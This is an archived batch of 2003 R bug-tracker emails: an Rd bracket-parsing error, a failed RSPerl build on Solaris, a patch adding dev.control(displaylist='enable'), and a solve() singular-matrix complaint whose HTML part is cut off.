Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h64I6gJH009438
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 20:06:42 +0200 (MET DST)
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.12.9/8.12.9) with ESMTP id h64I6gVh021916;
	Fri, 4 Jul 2003 19:06:42 +0100 (BST)
Date: Fri, 4 Jul 2003 19:06:42 +0100 (BST)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender: ripley@gannet.stats
To: Martin.Schlather@uni-bayreuth.de
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] (PR#3400)
In-Reply-To: <200307041745.h64HjBJH009366@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.44.0307041901220.15382-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Fri, 4 Jul 2003 Martin.Schlather@uni-bayreuth.de wrote:

> 
> Martin Maechler asked me to restate my problem.
> 
> Compiling the file (slightly modified w.r.t. the formerly
> attached file) that can be found at
>      http://www.geo.uni-bayreuth.de/~martin/filetransfer/xswms2d.Rd
> terminates with the error message
> 
> ******* Syntax error: mismatched or missing brackets in
> /-----
>   .....
> \-----
> 
> when compiled by
>     R CMD Rdconv -t txt xswms2d.Rd
> 
> However, the file does not cause any error after deleting the
> line
>       \item{a}{4}
> (line 530), for example. This line is within the simple
> environment
>      \itemize{
>        \item{a}{1} % if this line or
>        \item{a}{2} % this line or
>        \item{a}{3} % this line or
>        \item{a}{4} % this line is deleted no error occurs
>      }
> 
> Although there might be an error in my Rd code, the

There was, BTW: you had code inside an \itemize that was in no \item.

> appearance (or not appearance) of the error message is
> surprising, and the reason for the error is not clear
> from the message.

It does look like a bug, although as the FAQ asks, please don't report
diagnoses, especially in the subject line.

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272866 (PA)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3415 *
Subject: Installing RSPerl
From: nisai@lagrange.tampabaywater.org
Date: Sun, 6 Jul 2003 21:28:21 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3415 <==
From nisai@lagrange.tampabaywater.org Sun Jul  6 21:28:23 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h66JSLJH016347
	for <R-bugs@biostat.ku.dk>; Sun, 6 Jul 2003 21:28:22 +0200 (MET DST)
Date: Sun, 6 Jul 2003 21:28:21 +0200 (MET DST)
Message-Id: <200307061928.h66JSLJH016347@pubhealth.ku.dk>
From: nisai@lagrange.tampabaywater.org
To: R-bugs@biostat.ku.dk
Subject: Installing RSPerl

Full_Name: Nisai Wanakule
Version: 1.7.1
OS: Solaris 2.9
Submission from: (NULL) (65.32.94.36)


I tried to install RSPerl with --with-in-perl option and got some errors. R was
built with --enable-R-shlib as indicated in the RSPerl instructions. Here is the
list output during installation:

nisai@lagrange:src 102$ R CMD INSTALL -c --configure-args='--with-in-perl'
RSPerl_0.5-7.tar.gz
* Installing *source* package 'RSPerl' ...
Using '/usr/local/bin/perl' as the perl executable
Perl modules: 
Adding R package to list of Perl modules to enable callbacks to R from Perl
modules: threads re attrs XS::Typemap XS::APItest Unicode::Normalize Time::HiRes
Sys::Syslog Sys::Hostname Storable Socket SDBM_File
 PerlIO::via PerlIO::scalar PerlIO::encoding POSIX Opcode ODBM_File NDBM_File
MIME::Base64 List::Util IPC::SysV IO I18N::Langinfo GD
BM_File Filter::Util::Call File::Glob Fcntl Encode Digest::MD5 Devel::Peek
Devel::PPPort Devel::DProf Data::Dumper DB_File Cwd ByteL
oader Compress::Zlib Term::ReadKey Text::CSV_XS SQL::Statement DBI Time::HiRes
Apache::Symbol Apache::Leak HTML::Parser HTML::Embper
l DBD::Oracle DBD::ODBC NetCDF UDUNITS Storable DBD::Pg DBD::ODBC Apache::DB
Apache::Symbol Apache::Leak Digest::SHA1 Digest::MD2 Di
gest::MD5 MIME::Base64 HTML::Parser Image::Magick  R; linking:
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/threads/threads.so /usr/
local/lib/perl5/5.8.0/sun4-solaris/auto/re/re.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/attrs/attrs.so
/usr/local/lib/perl5/5.
8.0/sun4-solaris/auto/XS/Typemap/Typemap.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/XS/APItest/APItest.so
/usr/local/lib/perl5/
5.8.0/sun4-solaris/auto/Unicode/Normalize/Normalize.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/Time/HiRes/HiRes.so /usr/local/l
ib/perl5/5.8.0/sun4-solaris/auto/Sys/Syslog/Syslog.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/Sys/Hostname/Hostname.so /usr/loc
al/lib/perl5/5.8.0/sun4-solaris/auto/Storable/Storable.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/Socket/Socket.so /usr/local/l
ib/perl5/5.8.0/sun4-solaris/auto/SDBM_File/SDBM_File.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/PerlIO/via/via.so /usr/local/li
b/perl5/5.8.0/sun4-solaris/auto/PerlIO/scalar/scalar.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/PerlIO/encoding/encoding.so /us
r/local/lib/perl5/5.8.0/sun4-solaris/auto/POSIX/POSIX.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/Opcode/Opcode.so /usr/local/li
b/perl5/5.8.0/sun4-solaris/auto/ODBM_File/ODBM_File.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/NDBM_File/NDBM_File.so /usr/loca
l/lib/perl5/5.8.0/sun4-solaris/auto/MIME/Base64/Base64.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/List/Util/Util.so /usr/local/
lib/perl5/5.8.0/sun4-solaris/auto/IPC/SysV/SysV.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/IO/IO.so
/usr/local/lib/perl5/5.8.0/
sun4-solaris/auto/I18N/Langinfo/Langinfo.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/GDBM_File/GDBM_File.so
/usr/local/lib/perl5
/5.8.0/sun4-solaris/auto/Filter/Util/Call/Call.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/File/Glob/Glob.so
/usr/local/lib/perl
5/5.8.0/sun4-solaris/auto/Fcntl/Fcntl.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/Encode/Encode.so
/usr/local/lib/perl5/5.8.0/su
n4-solaris/auto/Digest/MD5/MD5.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/Devel/Peek/Peek.so
/usr/local/lib/perl5/5.8.0/sun4-so
laris/auto/Devel/PPPort/PPPort.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/Devel/DProf/DProf.so
/usr/local/lib/perl5/5.8.0/sun4-
solaris/auto/Data/Dumper/Dumper.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/DB_File/DB_File.so
/usr/local/lib/perl5/5.8.0/sun4-s
olaris/auto/Cwd/Cwd.so
/usr/local/lib/perl5/5.8.0/sun4-solaris/auto/ByteLoader/ByteLoader.so
/usr/local/lib/perl5/site_perl/5.8.0/su
n4-solaris/auto/Compress/Zlib/Zlib.so
/usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto/Term/ReadKey/ReadKey.so
/usr/local/lib/
perl5/site_perl/5.8.0/sun4-solaris/auto/Text/CSV_XS/CSV_XS.so
/usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto/SQL/Statement/S
tatement.so /usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto/DBI/DBI.so
/usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto
/Time/HiRes/HiRes.so
/usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto/Apache/Symbol/Symbol.so
/usr/local/lib/perl5/site_perl/5
.8.0/sun4-solaris/auto/Apache/Leak/Leak.so
/usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto/HTML/Parser/Parser.so
/usr/local/l
ib/perl5/site_perl/5.8.0/sun4-solaris/auto/HTML/Embperl/Embperl.so
/usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto/DBD/Oracle
/Oracle.so /usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto/DBD/ODBC/ODBC.so
/usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris
/auto/NetCDF/NetCDF.so
/usr/local/lib/perl5/site_perl/5.8.0/sun4-solaris/auto/UDUNITS/UDUNITS.so
/usr/local/lib/perl5/site_perl/auto
/Storable/Storable.so /usr/local/lib/perl5/site_perl/auto/DBD/Pg/Pg.so
/usr/local/lib/perl5/site_perl/auto/DBD/ODBC/ODBC.so /usr/loc
al/lib/perl5/site_perl/auto/Apache/DB/DB.so
/usr/local/lib/perl5/site_perl/auto/Apache/Symbol/Symbol.so
/usr/local/lib/perl5/site_pe
rl/auto/Apache/Leak/Leak.so
/usr/local/lib/perl5/site_perl/auto/Digest/SHA1/SHA1.so
/usr/local/lib/perl5/site_perl/auto/Digest/MD2/M
D2.so /usr/local/lib/perl5/site_perl/auto/Digest/MD5/MD5.so
/usr/local/lib/perl5/site_perl/auto/MIME/Base64/Base64.so /usr/local/lib
/perl5/site_perl/auto/HTML/Parser/Parser.so
/usr/local/lib/perl5/site_perl/auto/Image/Magick/Magick.so 
checking for gcc... gcc
checking for C compiler default output... a.out
checking whether the C compiler works... yes
checking whether we are cross compiling... no
checking for suffix of executables... 
checking for suffix of object files... o
checking whether we are using the GNU C compiler... yes
checking whether gcc accepts -g... yes
checking for gcc option to accept ANSI C... none needed
Support R in Perl: yes
configure: creating ./config.status
config.status: creating src/Makevars
config.status: creating R/RSUtils.S
config.status: creating inst/scripts/RSPerl.csh
config.status: creating src/RinPerlMakefile
config.status: creating src/Makefile.PL
making RinPerlMakefile
mksh: Fatal error in reader: = missing from replacement macro reference
Current working directory /tmp/R.INSTALL.3427/RSPerl/src
make: Fatal error: Can't find `Makefile.perl': No such file or directory
chmod: WARNING: can't access blib/lib/R.pm
cp: cannot access blib
Finished configuration
** libs
mksh: Fatal error in reader: = missing from replacement macro reference
Current working directory /tmp/R.INSTALL.3427/RSPerl/src
ERROR: compilation failed for package 'RSPerl'




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3424 *
Subject: feature enhancement request & patch:  dev.control(displaylist='en
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
Date: Mon, 7 Jul 2003 13:49:48 -0400 
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3424 <==
From mailnull@stat.math.ethz.ch Mon Jul  7 19:50:38 2003
Received: from stat.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h67HobJH025534
	for <R-bugs@biostat.ku.dk>; Mon, 7 Jul 2003 19:50:37 +0200 (MET DST)
Received: from stat.math.ethz.ch (localhost [127.0.0.1])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h67HoHUv026767
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Mon, 7 Jul 2003 19:50:17 +0200 (MEST)
Received: (from mailnull@localhost)
	by stat.math.ethz.ch (8.12.9/8.12.6/Submit) id h67HoHfK026766
	for R-bugs@biostat.ku.dk; Mon, 7 Jul 2003 19:50:17 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h67HoAUu026745
	for <r-bugs@lists.r-project.org>; Mon, 7 Jul 2003 19:50:10 +0200 (MEST)
Received: from mail-ny2.bigfish.com ([63.161.60.93] helo=mail2-ny2-R.bigfish.com)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19Za8T-00047m-00
	for <r-bugs@r-project.org>; Mon, 07 Jul 2003 12:50:45 -0500
Received: from mail2-ny2.bigfish.com (localhost.localdomain [127.0.0.1])
	by mail2-ny2-R.bigfish.com (Postfix) with ESMTP id 7C2F6231B5C
	for <r-bugs@r-project.org>; Mon,  7 Jul 2003 17:49:53 +0000 (UCT)
Received: by mail2-ny2 (MessageSwitch) id 1057600193402951_15340; Mon,  7 Jul 2003 17:49:53 +0000 (UCT)
Received: from gsun56.pfizer.com (ns1.pfizer.com [12.18.36.49])
	by mail2-ny2.bigfish.com (Postfix) with ESMTP id 2594723190F
	for <r-bugs@r-project.org>; Mon,  7 Jul 2003 17:49:53 +0000 (UCT)
Received: from groexms02.pfizer.com (localhost [127.0.0.1])
	by gsun56.pfizer.com (Switch-3.0.4/Switch-3.0.0) with ESMTP id h67HnqqN009747
	for <r-bugs@r-project.org>; Mon, 7 Jul 2003 13:49:53 -0400 (EDT)
Received: from groexcn04.pfizer.com (unverified) by groexms02.pfizer.com
 (Content Technologies SMTPRS 4.2.1) with ESMTP id <T63496f3e30ac1e08e4172@groexms02.pfizer.com> for <r-bugs@r-project.org>;
 Mon, 7 Jul 2003 13:49:49 -0400
Received: by groexcn04.pfizer.com with Internet Mail Service (5.5.2654.89)
	id <M9X97RM5>; Mon, 7 Jul 2003 13:49:49 -0400
Message-ID: <D7A3CFD7825BD6119B880002A58F06C20680A451@groexmb02.pfizer.com>
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Subject: feature enhancement request & patch:  dev.control(displaylist='en
	able')
Date: Mon, 7 Jul 2003 13:49:48 -0400 
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2654.89)
Content-Type: multipart/mixed ; boundary="----_=_NextPart_000_01C344B0.28BC0750"
X-BigFish: cv
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=1.1 required=5.0 tests=RCVD_IN_RFCI version=2.54
X-Spam-Level: *
X-Spam-Checker-Version: SpamAssassin 2.54 (1.174.2.17-2003-05-11-exp)

This message is in MIME format. Since your mail reader does not understand
this format, some or all of this message may not be legible.

------_=_NextPart_000_01C344B0.28BC0750
Content-Type: text/plain; charset="windows-1252"


Summary:

Currently R provides 
	> dev.control(displaylist='inhbit') 
to turn *off* the recording of graphics operations in a device, but there is
no method to explicitly turn it on.   

Attached is a patch which provides support for 
	> dev.control(displaylist='enable') 
to explicitly turn on recording of graphics operations.

Background:

I'm using R in a non-interactive context and want to be able to use dev.copy
to copy the graph from one device to another so that I can create graphs in
a number of output formats without re-running the sequence of plot commands
(which include some expensive computations).  

Unfortunately, this does not currently work for many graphics devices since
they have recording of graphics operations turned off by default, and there
is no way to turn it on.  The attached patch provides a modified dev.control
and support functions to allow display recording to be turned on.

With the attached, the following text produces 3 copies of the original plot
in the 3 different output formats:

	postscript(file="heatmap.eps", onefile=FALSE)
	dev.control(displaylist='enable')

	heatmap( matrix(rnorm(100),ncol=5))

	dev.copy(bitmap,file="heatmap.png", res=100); dev.off()
	dev.copy(pdf,file="heatmap.pdf", onefile=F); dev.off()

	dev.off()

I've tested this patch on today's R-patched under Solaris 8 with
postscript(), pdf(), bitmap(), and x11() and it appears to work correctly.

As an aside, I wonder if it might be a good idea to change the parameter to
dev.control to make it more mnemonic and easier to use.  For example, the
parameter could be 'record' and take a boolean argument instead of a
arbitrary string.    Further, it would be convenient for my use if the
'record' parameter was an optional parameter for the device creation
commands.  Thus one could do

	postscript(file="heatmap.eps", onefile=FALSE, record=TRUE)
	heatmap(...)
	...

-Greg

 <<dev_control.patch>> 


LEGAL NOTICE
Unless expressly stated otherwise, this message is confidential and may be privileged. It is intended for the addressee(s) only. Access to this E-mail by anyone else is unauthorized. If you are not an addressee, any disclosure or copying of the contents of this E-mail or any action taken (or not taken) in reliance on it is unauthorized and may be unlawful. If you are not an addressee, please inform the sender immediately.

------_=_NextPart_000_01C344B0.28BC0750
Content-Type: application/octet-stream;
	name="dev_control.patch"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
	filename="dev_control.patch"

diff -ur R-patched/src/library/base/R/device.R =
R-patched-grw/src/library/base/R/device.R=0A=
--- R-patched/src/library/base/R/device.R	2002-05-28 06:45:11.000000000 =
-0400=0A=
+++ R-patched-grw/src/library/base/R/device.R	2003-07-07 =
12:00:33.000000000 -0400=0A=
@@ -180,9 +180,12 @@=0A=
 {=0A=
     if(!missing(displaylist)) {=0A=
 	if(displaylist =3D=3D "inhibit") {=0A=
-            if(dev.cur() > 1) .Internal(dev.control())=0A=
+            if(dev.cur() > 1) .Internal(dev.control(FALSE))=0A=
             else stop("dev.control() called without an open graphics =
device")=0A=
-	} else stop("displaylist should be inhibit")=0A=
+	} else if(displaylist =3D=3D "enable") {=0A=
+            if(dev.cur() > 1) .Internal(dev.control(TRUE))=0A=
+            else stop("dev.control() called without an open graphics =
device")=0A=
+        } else stop("displaylist should be inhibit")=0A=
     }=0A=
     invisible()=0A=
 }=0A=
diff -ur R-patched/src/library/base/man/dev2.Rd =
R-patched-grw/src/library/base/man/dev2.Rd=0A=
--- R-patched/src/library/base/man/dev2.Rd	2002-05-28 =
06:45:12.000000000 -0400=0A=
+++ R-patched-grw/src/library/base/man/dev2.Rd	2003-07-07 =
12:00:18.000000000 -0400=0A=
@@ -17,8 +17,7 @@=0A=
     For \code{dev.print}, this includes \code{which} and by default =
any=0A=
     \code{\link{postscript}} arguments.}=0A=
   \item{which}{A device number specifying the device to copy to}=0A=
-  \item{displaylist}{A character string: the only valid value is=0A=
-    \code{"inhibit"}.}=0A=
+  \item{displaylist}{A character string: \code{"inhibit"} or =
\code{"enable"}.}=0A=
 }=0A=
 \description{=0A=
   \code{dev.copy} copies the graphics contents of the current =
device=0A=
@@ -35,7 +34,8 @@=0A=
 =0A=
   \code{dev.control} allows the user to control the recording of=0A=
   graphics operations in a device.  If \code{displaylist} is =
\code{"inhibit"}=0A=
-  then recording is turned off.=0A=
+  then recording is turned off.  If \code{displaylist} is =
\code{"enable"} =0A=
+  recording is turned on.=0A=
 }=0A=
 \value{=0A=
   \code{dev.copy} returns the name and number of the device which =
has=0A=
diff -ur R-patched/src/main/graphics.c =
R-patched-grw/src/main/graphics.c=0A=
--- R-patched/src/main/graphics.c	2003-02-04 10:19:52.000000000 =
-0500=0A=
+++ R-patched-grw/src/main/graphics.c	2003-07-07 11:16:39.000000000 =
-0400=0A=
@@ -6121,3 +6121,12 @@=0A=
     else=0A=
 	dd->displayListOn =3D FALSE;=0A=
 }=0A=
+=0A=
+void enableDisplayList(DevDesc *dd)=0A=
+{=0A=
+    GEinitDisplayList((GEDevDesc*) dd);=0A=
+    if (dd->newDevStruct)=0A=
+	((GEDevDesc*) dd)->dev->displayListOn =3D TRUE;=0A=
+    else=0A=
+	dd->displayListOn =3D TRUE;=0A=
+}=0A=
diff -ur R-patched/src/main/names.c R-patched-grw/src/main/names.c=0A=
--- R-patched/src/main/names.c	2003-03-22 21:13:18.000000000 -0500=0A=
+++ R-patched-grw/src/main/names.c	2003-07-07 11:48:45.000000000 =
-0400=0A=
@@ -716,7 +716,7 @@=0A=
 =0A=
 /* Graphics */=0A=
 =0A=
-{"dev.control",	do_devcontrol,	0,	111,	0,	{PP_FUNCALL, PREC_FN,	=
0}},=0A=
+{"dev.control",	do_devcontrol,	0,	111,	1,	{PP_FUNCALL, PREC_FN,	=
0}},=0A=
 {"dev.copy",	do_devcopy,	0,	111,	1,	{PP_FUNCALL, PREC_FN,	0}},=0A=
 {"dev.cur",	do_devcur,	0,	111,	0,	{PP_FUNCALL, PREC_FN,	0}},=0A=
 /*=0A=
diff -ur R-patched/src/main/plot.c R-patched-grw/src/main/plot.c=0A=
--- R-patched/src/main/plot.c	2003-02-25 18:08:41.000000000 -0500=0A=
+++ R-patched-grw/src/main/plot.c	2003-07-07 11:47:16.000000000 =
-0400=0A=
@@ -51,9 +51,13 @@=0A=
 =0A=
 SEXP do_devcontrol(SEXP call, SEXP op, SEXP args, SEXP env)=0A=
 {=0A=
+    int listFlag =3D LOGICAL(CAR(args))[0];=0A=
     checkArity(op, args);=0A=
-    inhibitDisplayList(CurrentDevice());=0A=
-    return R_NilValue;=0A=
+    if(listFlag)=0A=
+      enableDisplayList(CurrentDevice());=0A=
+    else=0A=
+      inhibitDisplayList(CurrentDevice());=0A=
+    return ScalarLogical(listFlag);=0A=
 }=0A=
 =0A=
 SEXP do_devcopy(SEXP call, SEXP op, SEXP args, SEXP env)=0A=

------_=_NextPart_000_01C344B0.28BC0750--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3427 *
Subject: 
From: "Bulutoglu Dursun A Civ AFIT/ENC" <Dursun.Bulutoglu@afit.edu>
Date: Mon, 7 Jul 2003 17:12:20 -0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3427 <==
From Dursun.Bulutoglu@afit.edu Mon Jul  7 23:12:31 2003
Received: from mr-afit.afit.edu (mr-afit.afit.edu [129.92.253.250])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h67LCUJI026236
	for <r-bugs@biostat.ku.dk>; Mon, 7 Jul 2003 23:12:31 +0200 (MET DST)
Received: from goldilocks.afit.edu ([129.92.1.5])
 by mr-afit.afit.edu (SAVSMTP 3.1.1.32) with SMTP id M2003070717132318342
 for <r-bugs@biostat.ku.dk>; Mon, 07 Jul 2003 17:13:23 -0400
Received: from ms-afit-01.afit.edu by goldilocks.afit.edu
          via smtpd (for mr-afit.afit.edu [129.92.253.250]) with SMTP; 7 Jul 2003 21:09:56 UT
X-MimeOLE: Produced By Microsoft Exchange V6.0.6249.0
content-class: urn:content-classes:message
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="----_=_NextPart_001_01C344CC.73C3DE10"
Subject: 
Date: Mon, 7 Jul 2003 17:12:20 -0400
Message-ID: <786E15B2275AE04A9051FAEC44F805B9012E3D43@ms-afit-01.afit.edu>
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
Thread-Index: AcNEzHK0yG+GufDjSTOxtoJHugNX1w==
From: "Bulutoglu Dursun A Civ AFIT/ENC" <Dursun.Bulutoglu@afit.edu>
To: <r-bugs@biostat.ku.dk>

This is a multi-part message in MIME format.

------_=_NextPart_001_01C344CC.73C3DE10
Content-Type: text/plain;
	charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Hi;

            I am having problems inverting matrices using the function
solve()

            For example R can not invert the following matrix

                 =20

              [,1]           [,2]              [,3]              [,4]
[,5]

  [1,]      25            500              11250           275000
7.106250e+06

  [2,]      500          11250           275000         7106250
1.906250e+08

  [3,]      11250       275000         7106250       190625000
5.247656e+09

  [4,]      275000     7106250       190625000     5247656250
1.471719e+11

  [5,]      7106250   190625000    5247656250   147171875000
4.184754e+12

solve(t(xxmodel)%*%(xxmodel))

Yields the following massage:

Error in solve.default(t(xxmodel) %*% (xxmodel)) : singular matrix `a'
in solve

The above 5X5 matrix is invertible. It has non-zero eigenvalues. Could
someone explain whether there is a problem in R's solve() function.

=20

Dursun Bulutoglu


------_=_NextPart_001_01C344CC.73C3DE10
Content-Type: text/html;
	charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

<html>

<head>
<meta http-equiv=3DContent-Type content=3D"text/html; =
charset=3Dus-ascii">
<meta name=3DGenerator content=3D"Microsoft Word 10 (filtered)">

<style>
<!--
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	font-size:12.0pt;
	font-family:"Times New Roman";}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;}
span.EmailStyle17
	{font-family:Arial;
	color:windowtext;}
@page Section1
	{size:8.5in 11.0in;
	margin:1.0in 1.25in 1.0in 1.25in;}
div.Section1
	{page:Section1;}
-->
</style>

</head>

<body lang=3DEN-US link=3Dblue vlink=3Dpurple>

<div class=3DSection1>

<p class=3DMsoNormal style=3D'text-indent:.5in'><font size=3D2 =
face=3DArial><span
style=3D'font-size:10.0pt;font-family:Arial'>Hi;</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp; I
am having problems inverting matrices using the function =
solve()</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp; For
example R can not invert the following matrix</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
 &nbsp;&nbsp;&nbsp;&nbsp;[,1]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[,2]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[,3]&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[,4]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[,5]</span></font><=
/p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp; [1,]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
25&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;500&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11250&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;275000 =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7.10625=
0e+06</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp; [2,]&nbsp;&nbsp;&nbsp;&nbsp; =
&nbsp;500&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11250&nbsp;&nbsp;&nbsp;&nbsp; =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;275000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;7106250 =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.906250e+08<=
/span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp; [3,]&nbsp;&nbsp; =
&nbsp;&nbsp;&nbsp;11250&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;275000&nbsp;&nbsp;&nbsp; =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7106250&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;190625000 =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.247656e+09</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp; [4,]&nbsp; =
&nbsp;&nbsp;&nbsp;&nbsp;275000&nbsp;&nbsp;
&nbsp;&nbsp;7106250&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;190625000&nbsp; =
&nbsp;&nbsp;&nbsp;5247656250
&nbsp;&nbsp;&nbsp;&nbsp;1.471719e+11</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp; [5,] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7106250 =
&nbsp;&nbsp;190625000
&nbsp;&nbsp;&nbsp;5247656250 &nbsp;&nbsp;147171875000 =
&nbsp;&nbsp;4.184754e+12</span></font></p>

